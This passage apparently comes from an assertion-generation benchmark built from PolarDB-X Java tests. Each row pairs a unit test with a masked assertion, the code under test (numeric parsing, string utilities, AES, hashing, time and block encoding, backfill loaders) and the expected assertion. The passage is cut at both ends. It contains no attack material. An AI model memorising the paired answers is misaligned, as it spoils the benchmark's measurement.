>= 0) { pos++; } } } } else { shift = dotPos - pos; while (pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0) { pos++; } }  needHandleExp = true; break; }  if (bytes[pos] == '.') { if (dotPos != 0) {  addOn = 0;  needHandleExp = true; break; } else { dotPos = pos + 1; } continue; }  break; } if (!needHandleExp) {  shift = dotPos != 0 ? (dotPos - pos) : 0; addOn = 0; }  if (digits == 0) { pos = begin;  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; }  if (pos < endPos && (bytes[pos] == 'e' || bytes[pos] == '+')) { pos++; if (pos < endPos) { long exponent; boolean isNegativeExp = bytes[pos] == '-'; if (isNegativeExp || bytes[pos] == '+') { if (++pos == endPos) {  handleResult(isUnsigned, results, pos, isNeg, longResult); return; } } for (exponent = 0; pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0; pos++) { if (exponent <= (SIGNED_MAX_LONG - value) / 10) { exponent = exponent * 10 + value; } else { // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } } shift += isNegativeExp ? -exponent : exponent; } }  if (shift == 0) { if (addOn != 0) { if (UnsignedLongs.compare(longResult, UNSIGNED_LONG_MAX) == 0) { // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } longResult++; }  handleResult(isUnsigned, results, pos, isNeg, longResult); return; }  if (shift < 0) { long d, r; if (shift == SIGNED_INT_32_MIN || -shift >= DIGITS_IN_UNSIGNED_LONG) {  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } d = D_10[-shift]; r = UnsignedLongs.remainder(longResult, d) * 2; longResult = UnsignedLongs.divide(longResult, d); if (UnsignedLongs.compare(r, d) >= 0) { longResult++; }  handleResult(isUnsigned, results, pos, isNeg, longResult); return; }  if (shift > DIGITS_IN_UNSIGNED_LONG) { if (longResult == 0) {  handleResult(isUnsigned, results, pos, isNeg, longResult); return; } // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; }  for (; shift > 0; shift--, longResult *= 10) { if (UnsignedLongs.compare(longResult, CUT_OFF) > 0) { // Overflow, number too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } }  handleResult(isUnsigned, results, pos, isNeg, longResult);  }"	"assertTrue(actual.equals(expect), ""actual = "" + actual + "", expect = "" + expect)"
"testParsingWithRoundUnsigned() { long[] result = new long[3]; IntStream.range(0, 1 << 10) .mapToObj(i -> generateDecimal()) .forEach( bytes -> { StringNumericParser.parseStringWithRound(bytes, 0, bytes.length, true, result); String actual = String.valueOf(result[StringNumericParser.NUMERIC_INDEX]); String expect = new BigDecimal(new String(bytes)).setScale(0, RoundingMode.HALF_UP).toPlainString(); Assert.""<AssertPlaceHolder>""; } ); }
parseStringWithRound(byte[] bytes, final int startPos, final int endPos, final boolean isUnsigned, long[] results) { int pos = startPos;  while (pos < endPos && (bytes[pos] == ' ' || bytes[pos] == '\t')) { pos++; }  if (pos >= endPos) {  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; }  boolean isNeg; if ((isNeg = (bytes[pos] == '-')) || (bytes[pos] == '+')) { if (++pos == endPos) { results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; } }  int begin = pos; int nextEnd = (pos + 9) > endPos ? endPos : (pos + 9);  int value; int intResult; long longResult; for (intResult = 0; pos < nextEnd && (value = bytes[pos] - '0') < 10 && value >= 0; pos++) { intResult = intResult * 10 + value; }  if (pos >= endPos) { if (isNeg) { if (isUnsigned) { results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_ERANGE; results[POSITION_INDEX] = pos; return; } else { results[NUMERIC_INDEX] = -(long) intResult; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } } else { results[NUMERIC_INDEX] = intResult; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } }  int digits = pos - begin; int dotPos = 0; int addOn = 0; int shift = 0; boolean needHandleExp = false; longResult = intResult;  for (; pos < endPos; pos++) { if ((value = bytes[pos] - '0') < 10 && value >= 0) { if (UnsignedLongs.compare(longResult, CUT_OFF) < 0 || (UnsignedLongs.compare(longResult, CUT_OFF) == 0 && UnsignedLongs.compare(value, CUT_LIM) <= 0)) { longResult = longResult * 10 + value; digits++; continue; }  if (UnsignedLongs.compare(longResult, CUT_OFF) == 0) { longResult = UNSIGNED_LONG_MAX; addOn = 1; pos++; } else { addOn = (bytes[pos] - '5') >= 0 ? 1 : 0; } if (dotPos == 0) { for (; pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0; shift++, pos++) { if (pos < endPos && Byte.toUnsignedInt(bytes[pos]) == '.') { pos++; while (pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0) { pos++; } } } } else { shift = dotPos - pos; while (pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0) { pos++; } }  needHandleExp = true; break; }  if (bytes[pos] == '.') { if (dotPos != 0) {  addOn = 0;  needHandleExp = true; break; } else { dotPos = pos + 1; } continue; }  break; } if (!needHandleExp) {  shift = dotPos != 0 ? (dotPos - pos) : 0; addOn = 0; }  if (digits == 0) { pos = begin;  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; }  if (pos < endPos && (bytes[pos] == 'e' || bytes[pos] == '+')) { pos++; if (pos < endPos) { long exponent; boolean isNegativeExp = bytes[pos] == '-'; if (isNegativeExp || bytes[pos] == '+') { if (++pos == endPos) {  handleResult(isUnsigned, results, pos, isNeg, longResult); return; } } for (exponent = 0; pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0; pos++) { if (exponent <= (SIGNED_MAX_LONG - value) / 10) { exponent = exponent * 10 + value; } else { // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } } shift += isNegativeExp ? -exponent : exponent; } }  if (shift == 0) { if (addOn != 0) { if (UnsignedLongs.compare(longResult, UNSIGNED_LONG_MAX) == 0) { // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } longResult++; }  handleResult(isUnsigned, results, pos, isNeg, longResult); return; }  if (shift < 0) { long d, r; if (shift == SIGNED_INT_32_MIN || -shift >= DIGITS_IN_UNSIGNED_LONG) {  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } d = D_10[-shift]; r = UnsignedLongs.remainder(longResult, d) * 2; longResult = UnsignedLongs.divide(longResult, d); if (UnsignedLongs.compare(r, d) >= 0) { longResult++; }  handleResult(isUnsigned, results, pos, isNeg, longResult); return; }  if (shift > DIGITS_IN_UNSIGNED_LONG) { if (longResult == 0) {  handleResult(isUnsigned, results, pos, isNeg, longResult); return; } // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; }  for (; shift > 0; shift--, longResult *= 10) { if (UnsignedLongs.compare(longResult, CUT_OFF) > 0) { // Overflow, number too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } }  handleResult(isUnsigned, results, pos, isNeg, longResult);  }"	"assertTrue(actual.equals(expect), ""original bytes = "" + new String(bytes) + "", actual = "" + actual + "", expect = "" + expect)"
"testParsingWithRoundMinusUnsigned() { long[] result = new long[3]; IntStream.range(0, 1 << 10) .mapToObj(i -> generateDecimal()) .forEach( bytes -> { // change to negative number byte[] newBytes = new byte[bytes.length + 1]; newBytes[0] = '-'; System.arraycopy(bytes, 0, newBytes, 1, bytes.length);  StringNumericParser.parseStringWithRound(newBytes, 0, newBytes.length, true, result); String actual = String.valueOf(result[StringNumericParser.NUMERIC_INDEX]); String expect = new BigDecimal(0).toPlainString(); Assert.""<AssertPlaceHolder>""; } ); }
parseStringWithRound(byte[] bytes, final int startPos, final int endPos, final boolean isUnsigned, long[] results) { int pos = startPos;  while (pos < endPos && (bytes[pos] == ' ' || bytes[pos] == '\t')) { pos++; }  if (pos >= endPos) {  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; }  boolean isNeg; if ((isNeg = (bytes[pos] == '-')) || (bytes[pos] == '+')) { if (++pos == endPos) { results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; } }  int begin = pos; int nextEnd = (pos + 9) > endPos ? endPos : (pos + 9);  int value; int intResult; long longResult; for (intResult = 0; pos < nextEnd && (value = bytes[pos] - '0') < 10 && value >= 0; pos++) { intResult = intResult * 10 + value; }  if (pos >= endPos) { if (isNeg) { if (isUnsigned) { results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_ERANGE; results[POSITION_INDEX] = pos; return; } else { results[NUMERIC_INDEX] = -(long) intResult; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } } else { results[NUMERIC_INDEX] = intResult; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } }  int digits = pos - begin; int dotPos = 0; int addOn = 0; int shift = 0; boolean needHandleExp = false; longResult = intResult;  for (; pos < endPos; pos++) { if ((value = bytes[pos] - '0') < 10 && value >= 0) { if (UnsignedLongs.compare(longResult, CUT_OFF) < 0 || (UnsignedLongs.compare(longResult, CUT_OFF) == 0 && UnsignedLongs.compare(value, CUT_LIM) <= 0)) { longResult = longResult * 10 + value; digits++; continue; }  if (UnsignedLongs.compare(longResult, CUT_OFF) == 0) { longResult = UNSIGNED_LONG_MAX; addOn = 1; pos++; } else { addOn = (bytes[pos] - '5') >= 0 ? 1 : 0; } if (dotPos == 0) { for (; pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0; shift++, pos++) { if (pos < endPos && Byte.toUnsignedInt(bytes[pos]) == '.') { pos++; while (pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0) { pos++; } } } } else { shift = dotPos - pos; while (pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0) { pos++; } }  needHandleExp = true; break; }  if (bytes[pos] == '.') { if (dotPos != 0) {  addOn = 0;  needHandleExp = true; break; } else { dotPos = pos + 1; } continue; }  break; } if (!needHandleExp) {  shift = dotPos != 0 ? (dotPos - pos) : 0; addOn = 0; }  if (digits == 0) { pos = begin;  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = MY_ERRNO_EDOM; results[POSITION_INDEX] = pos; return; }  if (pos < endPos && (bytes[pos] == 'e' || bytes[pos] == '+')) { pos++; if (pos < endPos) { long exponent; boolean isNegativeExp = bytes[pos] == '-'; if (isNegativeExp || bytes[pos] == '+') { if (++pos == endPos) {  handleResult(isUnsigned, results, pos, isNeg, longResult); return; } } for (exponent = 0; pos < endPos && (value = bytes[pos] - '0') < 10 && value >= 0; pos++) { if (exponent <= (SIGNED_MAX_LONG - value) / 10) { exponent = exponent * 10 + value; } else { // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } } shift += isNegativeExp ? -exponent : exponent; } }  if (shift == 0) { if (addOn != 0) { if (UnsignedLongs.compare(longResult, UNSIGNED_LONG_MAX) == 0) { // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } longResult++; }  handleResult(isUnsigned, results, pos, isNeg, longResult); return; }  if (shift < 0) { long d, r; if (shift == SIGNED_INT_32_MIN || -shift >= DIGITS_IN_UNSIGNED_LONG) {  results[NUMERIC_INDEX] = 0; results[ERROR_INDEX] = 0; results[POSITION_INDEX] = pos; return; } d = D_10[-shift]; r = UnsignedLongs.remainder(longResult, d) * 2; longResult = UnsignedLongs.divide(longResult, d); if (UnsignedLongs.compare(r, d) >= 0) { longResult++; }  handleResult(isUnsigned, results, pos, isNeg, longResult); return; }  if (shift > DIGITS_IN_UNSIGNED_LONG) { if (longResult == 0) {  handleResult(isUnsigned, results, pos, isNeg, longResult); return; } // too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; }  for (; shift > 0; shift--, longResult *= 10) { if (UnsignedLongs.compare(longResult, CUT_OFF) > 0) { // Overflow, number too big handleRetTooBig(results, isUnsigned, isNeg, pos); return; } }  handleResult(isUnsigned, results, pos, isNeg, longResult);  }"	"assertTrue(actual.equals(expect), ""actual = "" + actual + "", expect = "" + expect)"
"testFillTabWithSpace() { String sql = ""   select sum(rate)      from                                                                          feed_receive_0117                                                            t             where       RATED_UID=?     and RATER_UID=?     and suspended=0 and validscore=1      and rater_type=?     and trade_closingdate>=?     and trade_closingdate<?     and id<>?        and (IFNULL(IMPORT_FROM, 0)&8) = 0        #@#mysql_feel_01#@#EXECUTE_A_SQL_TIMEOUT#@#1#@#484#@#484#@#484""; String assertSql = ""select sum(rate) from feed_receive_0117 t where RATED_UID=? and RATER_UID=? and suspended=0 and validscore=1 and rater_type=? and trade_closingdate>=? and trade_closingdate<? and id<>? and (IFNULL(IMPORT_FROM, 0)&8) = 0 #@#mysql_feel_01#@#EXECUTE_A_SQL_TIMEOUT#@#1#@#484#@#484#@#484""; String acutulSql = null; acutulSql = TStringUtil.fillTabWithSpace(sql); Assert.""<AssertPlaceHolder>""; }
fillTabWithSpace(String str) { if (str == null) { return null; }  str = str.trim(); int sz = str.length(); StringBuilder buffer = new StringBuilder(sz);  int index = 0, index0 = -1, index1 = -1; for (int i = 0; i < sz; i++) { char c = str.charAt(i); if (!Character.isWhitespace(c)) { if (index0 != -1) {  if (index0 != index1 || str.charAt(i - 1) != ' ') { buffer.append(str.substring(index, index0)).append("" ""); index = index1 + 1; } } index0 = index1 = -1; } else { if (index0 == -1) { index0 = index1 = i; } else { index1 = i; } } }  buffer.append(str.substring(index)); return buffer.toString(); }"	assertEquals(assertSql, acutulSql)
"testRemoveBetweenWithSplitor() { String sql = ""/*+UNIT_VALID({valid_key:123})*/select * from table""; sql = TStringUtil.removeBetween(sql, ""/*+UNIT_VALID("", "")*/""); Assert.""<AssertPlaceHolder>""; }
removeBetween(String sql, String start, String end) { if (sql == null) { return null; }  if (start == null || end == null) { return sql; }  int index0 = sql.indexOf(start); if (index0 == -1) { return sql; } int index1 = sql.indexOf(end, index0); if (index1 == -1) { return sql; } StringBuilder sb = new StringBuilder(); sb.append(sql.substring(0, index0)); sb.append("" ""); sb.append(sql.substring(index1 + end.length())); return sb.toString(); }"	"assertEquals("" select * from table"", sql)"
"testHex2Int() { Random random = new Random(); for (int i = 0; i < 100; ++i) { int value = random.nextInt(); String hex = Integer.toHexString(value); int hex2Int = TStringUtil.hex2Int(hex); Assert.""<AssertPlaceHolder>""; } }
hex2Int(String hexString) { int value = 0; for (int i = 0; i < hexString.length(); i++) { char ch = hexString.charAt(i); if (ch >= '0' && ch <= '9') { value <<= 4; value |= ch - '0'; continue; } if (ch >= 'a' && ch <= 'f') { value <<= 4; value |= ch - 'a' + 10; continue; } } return value; }"	assertTrue(hex2Int == value)
"Exception { final int[] keylens = {128, 192, 256}; final String[] algorithms = {""ecb"", ""cbc"", ""cfb1"", ""cfb8"", ""cfb128"", ""ofb""};  final String plainText = ""ZqEDZ4vsRNmfex0""; final String key = ""key""; for (int keylen : keylens) { for (String algo : algorithms) { String mode = String.format(""aes-%d-%s"", keylen, algo); BlockEncryptionMode encryptionMode = new BlockEncryptionMode(mode, true);  Random random = new Random(); byte[] iv = new byte[16]; random.nextBytes(iv);  byte[] crypto = AesUtil.encryptToBytes(encryptionMode, plainText.getBytes(), key.getBytes(), iv); byte[] decryptedResult = AesUtil.decryptToBytes(encryptionMode, crypto, key.getBytes(), iv); String decryptedStr = new String(decryptedResult); Assert.""<AssertPlaceHolder>""; } }  }
decryptToBytes(BlockEncryptionMode encryptionMode, byte[] crypto, byte[] keyBytes, byte[] iv) throws Exception { if (!encryptionMode.mode.initVectorRequired) { return doDecrypt(encryptionMode, crypto, keyBytes, null); } byte[] iv16 = new byte[IV_LENGTH]; System.arraycopy(iv, 0, iv16, 0, IV_LENGTH); return doDecrypt(encryptionMode, crypto, keyBytes, iv16); }"	"assertEquals(""Failed in mode "" + mode, decryptedStr, plainText)"
"testXxHashStream() { final int times = 30; IStreamingHasher myXxHash64 = new XxHash_64Hasher(0);  for (int i = 0; i < times; i++) { int len = i * 8 + random.nextInt(8); byte[] input1 = new byte[len]; byte[] input2 = new byte[len]; random.nextBytes(input1); random.nextBytes(input2); long l = random.nextLong(); // don't use guava which is based on big-endian byte[] longBytes = ByteBuffer.allocate(8).order(ByteUtil.PLATFORM_ENDIAN).putLong(l).array(); XxHash64 xxHash64 = new XxHash64(); long expectHash = xxHash64.update(input1).update(longBytes).update(input2).update(longBytes).hash(); long actualHash = myXxHash64.putBytes(input1).putLong(l).putBytes(input2).putLong(l).hash().asLong();  Assert.""<AssertPlaceHolder>""; } }
hash() { long hash; if (bodyLength > 0) { hash = computeBody(); } else { hash = seed + PRIME64_5; }  hash += bodyLength + bufferSize;  return updateTail(hash, buffer, BUFFER_ADDRESS, 0, bufferSize); }"	"assertEquals(String.format(""Failed at round %d, length %d"", i, len), expectHash, actualHash)"
"testCalculateDataObjectSize() { List<Object> objects = Arrays.asList( (byte) 42, (short) 42, (int) 42, (long) 42, (float) 3.14, (double) 3.14, new BigInteger(""42""), new BigDecimal(""1551353537.444912""), new BigDecimal(12345L), ""Hello, World!"", new java.sql.Date(1551353537L), new java.sql.Timestamp(1551353537L), new java.sql.Time(1551353537L), ""Hello, World!"".getBytes() ); for (Object object : objects) { long result = ObjectSizeUtils.calculateDataSize(object); long actual = ObjectSizeUtils.calculateObjectSize(object); if (result != actual) { System.err.println(""not equals! estimated size = "" + result + "", actual size = "" + actual + "", class = "" + object.getClass().getCanonicalName()); } ""<AssertPlaceHolder>""; } }
calculateObjectSize(Object object) { ClassLayout layout = parseInstance(object); return layout.instanceSize(); }"	assertTrue(result >= actual)
"testDatetime() { IntStream.range(0, 1 << 20) .mapToObj( i -> RandomTimeGenerator.generateDatetimeString(1) ) .map( l -> l.get(0) ) .forEach( s -> { MysqlDateTime t = StringTimeParser.parseDatetime(((String) s).getBytes()); if (t == null) { return; } long l = TimeStorage.writeTimestamp(t); MysqlDateTime t1 = TimeStorage.readTimestamp(l); Assert.""<AssertPlaceHolder>""; } ); }
readTimestamp(long l) { MysqlDateTime t = new MysqlDateTime(); t.setNeg(l < 0); l = Math.abs(l);  t.setSecondPart((l % (1L << 24)) * 1000L);  long l2 = l >> 24; long ymd = l2 >> 17; long ym = ymd >> 5; t.setDay(ymd % (1L << 5)); t.setMonth(ym % 13); t.setYear(ym / 13);  long hms = l2 % (1L << 17); t.setSecond(hms % (1L << 6)); t.setMinute((hms >> 6) % (1L << 6)); t.setHour(hms >> 12);  t.setSqlType(Types.TIMESTAMP); return t; }"	assertEquals(t.toString(), t1.toString())
"testDate() { IntStream.range(0, 1 << 20) .mapToObj( i -> RandomTimeGenerator.generateDatetimeString(1) ) .map( l -> l.get(0) ) .forEach( s -> { MysqlDateTime t = StringTimeParser.parseDatetime(((String) s).getBytes()); if (t == null) { return; } t.setHour(0); t.setMinute(0); t.setSecond(0); t.setSecondPart(0); long l = TimeStorage.writeDate(t); MysqlDateTime t1 = TimeStorage.readDate(l); Assert.""<AssertPlaceHolder>""; } ); }
readDate(long l) { MysqlDateTime t = readTimestamp(l); t.setSqlType(Types.DATE); return t; }"	assertEquals(t.toString(), t1.toString())
"testBlobEncoding() { // new 4 blob objects final Blob[] blobs = new Blob[] { new com.alibaba.polardbx.optimizer.core.datatype.Blob(new byte[] {0x7E, 0x7F}), new com.alibaba.polardbx.optimizer.core.datatype.Blob(new byte[] {0x1, 0x2, 0x3}), new com.alibaba.polardbx.optimizer.core.datatype.Blob(new byte[] {0x4, 0x5, 0x6, 0x7}), new com.alibaba.polardbx.optimizer.core.datatype.Blob(new byte[] {0x8, 0x9, 0xA, 0xB, 0xC}) };  // get blob block BlobBlockBuilder blobBlockBuilder = new BlobBlockBuilder(1024); for (Blob blob : blobs) { blobBlockBuilder.appendNull(); blobBlockBuilder.writeBlob(blob); } Block blobBlock = blobBlockBuilder.build();  // serialize BlobBlockEncoding encoding = new BlobBlockEncoding(); SliceOutput output = new DynamicSliceOutput(8); encoding.writeBlock(output, blobBlock);  // deserialize Block blobBlockShuffled = encoding.readBlock(output.slice().getInput());  // check for (int i = 0; i != blobBlock.getPositionCount(); i++) { ""<AssertPlaceHolder>""; } }
equals(int position, Block otherBlock, int otherPosition) { boolean n1 = isNull(position); boolean n2 = otherBlock.isNull(otherPosition); if (n1 && n2) { return true; } else if (n1 != n2) { return false; } if (otherBlock instanceof BlobBlock || otherBlock instanceof BlobBlockBuilder) { return DataTypes.BlobType.compare(getBlob(position), otherBlock.getBlob(otherPosition)) == 0; } else { throw new AssertionError(); } }"	assertTrue(blobBlock.equals(i, blobBlockShuffled, i))
"testDate() {  final DateType dataType = new DateType(TEST_SCALE); DateBlockBuilder dateBlockBuilder = new DateBlockBuilder(TEST_SIZE, dataType, new ExecutionContext());  // write List<String> values = IntStream.range(0, TEST_SIZE) .mapToObj( i -> RandomTimeGenerator.generateDatetimeString(1) ) .map( l -> R.nextInt() % 4 == 0 ? null : (String) l.get(0) ) .map(String.class::cast) .collect(Collectors.toList());  values.forEach(dateBlockBuilder::writeString); Block block = dateBlockBuilder.build();  // serialization & deserialization DateBlockEncoding encoding = new DateBlockEncoding(); SliceOutput sliceOutput = new DynamicSliceOutput(1 << 10); encoding.writeBlock(sliceOutput, block);  Slice slice = sliceOutput.slice(); Block block1 = encoding.readBlock(slice.getInput());  IntStream.range(0, TEST_SIZE) .forEach( i -> { boolean isEqual = block.equals(i, block1, i); ""<AssertPlaceHolder>""; } ); }
equals(int position, Block other, int otherPosition) { position = realPositionOf(position); if (other instanceof DateBlock) { return equalsInner(position, other.cast(DateBlock.class), otherPosition); } else if (other instanceof DateBlockBuilder) { return equalsInner(position, (DateBlockBuilder) other, otherPosition); } else { throw new AssertionError(); } }"	assertTrue(isEqual)
"testTimestamp() {  final TimestampType dataType = new TimestampType(TEST_SCALE); TimestampBlockBuilder timestampBlockBuilder = new TimestampBlockBuilder(TEST_SIZE, dataType, new ExecutionContext());  // write List<String> values = IntStream.range(0, TEST_SIZE) .mapToObj( i -> RandomTimeGenerator.generateDatetimeString(1) ) .map( l -> R.nextInt() % 4 == 0 ? null : (String) l.get(0) ) .map(String.class::cast) .collect(Collectors.toList());  values.forEach(timestampBlockBuilder::writeString); Block block = timestampBlockBuilder.build();  // serialization & deserialization TimestampBlockEncoding encoding = new TimestampBlockEncoding(); SliceOutput sliceOutput = new DynamicSliceOutput(1 << 10); encoding.writeBlock(sliceOutput, block);  Slice slice = sliceOutput.slice(); Block block1 = encoding.readBlock(slice.getInput());  IntStream.range(0, TEST_SIZE) .forEach( i -> { boolean isEqual = block.equals(i, block1, i); Assert.""<AssertPlaceHolder>""; } ); }
equals(int position, Block other, int otherPosition) { position = realPositionOf(position); if (other instanceof TimestampBlock) { return equalsInner(position, other.cast(TimestampBlock.class), otherPosition); } else if (other instanceof TimestampBlockBuilder) { return equalsInner(position, (TimestampBlockBuilder) other, otherPosition); } else { throw new AssertionError(); } }"	assertTrue(isEqual)
"testEncoding() { final int size = 5; ULongBlockBuilder blockBuilder = new ULongBlockBuilder(size); blockBuilder.writeUInt64(UInt64.MAX_UINT64); blockBuilder.writeObject(null); blockBuilder.writeUInt64(UInt64.UINT64_ZERO); blockBuilder.writeUInt64(UInt64.fromLong(-2L)); blockBuilder.writeObject(null);  ULongBlock block = (ULongBlock) blockBuilder.build(); ULongBlockEncoding encoding = new ULongBlockEncoding(); SliceOutput output = new DynamicSliceOutput(size);  encoding.writeBlock(output, block);  SliceInput input = output.slice().getInput(); ULongBlock block1 = (ULongBlock) encoding.readBlock(input);  for (int i = 0; i < size; i++) { Assert.""<AssertPlaceHolder>""; } }
getObject(int position) { return isNull(position) ? null : getUInt64(position); }"	assertEquals(block.getObject(i), block1.getObject(i))
"Exception { Class loaderClass = Class.forName(""com.alibaba.polardbx.executor.gsi.backfill.GsiLoader""); Constructor[] constructors = loaderClass.getDeclaredConstructors(); Constructor protectedConstructor = constructors[0]; protectedConstructor.setAccessible(true);  BiFunction<List<RelNode>, ExecutionContext, List<Cursor>> executeFunc = (List<RelNode> inputs, ExecutionContext executionContext1) -> { List<Cursor> inputCursors = new ArrayList<>(inputs.size()); return inputCursors; };  ExecutionContext ec = Mockito.mock(ExecutionContext.class); ITransactionManager tm = Mockito.mock(ITransactionManager.class); ExecutorContext executorContext = Mockito.mock(ExecutorContext.class); SqlInsert sqlInsert = Mockito.mock(SqlInsert.class); ExecutionPlan executionPlan = Mockito.mock(ExecutionPlan.class); ITransaction transaction = Mockito.mock(ITransaction.class);  when(ec.getBackfillReturning()).thenReturn(null); when(ec.copy()).thenReturn(ec); when(ec.isReadOnly()).thenReturn(false); when(ec.getTransaction()).thenReturn(transaction); when(tm.createTransaction(Mockito.any(ITransactionPolicy.TransactionClass.class), Mockito.any(ExecutionContext.class))).thenReturn(transaction); when(executorContext.getTransactionManager()).thenReturn(tm);  List<Map<Integer, ParameterContext>> batchParams = new ArrayList<>(); Map<Integer, ParameterContext> param = new HashMap<>(); batchParams.add(param);  Pair<ExecutionContext, Pair<String, String>> baseEcAndIndexPair = new Pair<>(ec, new Pair<>(""wumu"", ""t1""));  try (MockedStatic<ExecutorContext> executorContextMockedStatic = Mockito.mockStatic(ExecutorContext.class)) { when(ExecutorContext.getContext(Mockito.anyString())).thenReturn(executorContext);  Object[] constructorArgs = new Object[] { ""wumu"", ""t1"", sqlInsert, sqlInsert, executionPlan, new int[2], new int[2], executeFunc, ""a""}; Object loaderObject = protectedConstructor.newInstance(constructorArgs);  GsiLoader loader = Mockito.spy((GsiLoader) loaderObject); doReturn(1024).when(loader) .executeInsert(Mockito.any(SqlInsert.class), Mockito.anyString(), Mockito.anyString(), Mockito.any(ExecutionContext.class), Mockito.anyString(), Mockito.anyString());  Assert.""<AssertPlaceHolder>""; } }
fillIntoIndex(List<Map<Integer, ParameterContext>> batchParams, Pair<ExecutionContext, Pair<String, String>> baseEcAndIndexPair, Supplier<Boolean> checker) { if (usingBackfillReturning) { return fillIntoIndexWithReturning(batchParams, baseEcAndIndexPair, checker); } else { return fillIntoIndexWithInsert(batchParams, baseEcAndIndexPair, checker); } }"	assertEquals(1024, loader.fillIntoIndex(batchParams, baseEcAndIndexPair, () -> true))
"Exception { Class loaderClass = Class.forName(""com.alibaba.polardbx.executor.gsi.backfill.GsiLoader""); Constructor[] constructors = loaderClass.getDeclaredConstructors(); Constructor protectedConstructor = constructors[0]; protectedConstructor.setAccessible(true);  BiFunction<List<RelNode>, ExecutionContext, List<Cursor>> executeFunc = (List<RelNode> inputs, ExecutionContext executionContext1) -> { List<Cursor> inputCursors = new ArrayList<>(inputs.size()); return inputCursors; };  ExecutionContext ec = Mockito.mock(ExecutionContext.class); ITransactionManager tm = Mockito.mock(ITransactionManager.class); ExecutorContext executorContext = Mockito.mock(ExecutorContext.class); SqlInsert sqlInsert = Mockito.mock(SqlInsert.class); ExecutionPlan executionPlan = Mockito.mock(ExecutionPlan.class); ITransaction transaction = Mockito.mock(ITransaction.class);  when(ec.getBackfillReturning()).thenReturn(null); when(ec.copy()).thenReturn(ec); when(ec.isReadOnly()).thenReturn(false); when(ec.getTransaction()).thenReturn(transaction); when(tm.createTransaction(Mockito.any(ITransactionPolicy.TransactionClass.class), Mockito.any(ExecutionContext.class))).thenReturn(transaction); when(executorContext.getTransactionManager()).thenReturn(tm);  List<Map<Integer, ParameterContext>> batchParams = new ArrayList<>(); Map<Integer, ParameterContext> param = new HashMap<>(); batchParams.add(param);  Pair<ExecutionContext, Pair<String, String>> baseEcAndIndexPair = new Pair<>(ec, new Pair<>(""wumu"", ""t1""));  try (MockedStatic<ExecutorContext> executorContextMockedStatic = Mockito.mockStatic(ExecutorContext.class)) { when(ExecutorContext.getContext(Mockito.anyString())).thenReturn(executorContext);  Object[] constructorArgs = new Object[] { ""wumu"", ""t1"", sqlInsert, sqlInsert, executionPlan, new int[2], new int[2], executeFunc, ""a""}; Object loaderObject = protectedConstructor.newInstance(constructorArgs);  GsiLoader loader = Mockito.spy((GsiLoader) loaderObject); doThrow(new TddlRuntimeException(ErrorCode.ERR_GLOBAL_SECONDARY_INDEX_BACKFILL_DUPLICATE_ENTRY, ""error"")) .when(loader) .executeInsert(Mockito.any(SqlInsert.class), Mockito.anyString(), Mockito.anyString(), Mockito.any(ExecutionContext.class), Mockito.anyString(), Mockito.anyString());  try { loader.fillIntoIndex(batchParams, baseEcAndIndexPair, () -> true); } catch (TddlRuntimeException e) { Assert.""<AssertPlaceHolder>""; } } }
fillIntoIndex(List<Map<Integer, ParameterContext>> batchParams, Pair<ExecutionContext, Pair<String, String>> baseEcAndIndexPair, Supplier<Boolean> checker) { if (usingBackfillReturning) { return fillIntoIndexWithReturning(batchParams, baseEcAndIndexPair, checker); } else { return fillIntoIndexWithInsert(batchParams, baseEcAndIndexPair, checker); } }"	"assertTrue(e.getMessage().contains(""error""))"
"testBackfillReturningLoader() { ExecutionContext ec = Mockito.mock(ExecutionContext.class);  Parameters parameters = Mockito.mock(Parameters.class);  List<Map<Integer, ParameterContext>> params = new ArrayList<>(); params.add(new HashMap<>()); params.add(new HashMap<>());  when(parameters.getBatchParameters()).thenReturn(params);  when(ec.getParams()).thenReturn(parameters);  List<Map<Integer, ParameterContext>> returningResult = new ArrayList<>();  Assert.""<AssertPlaceHolder>""; }
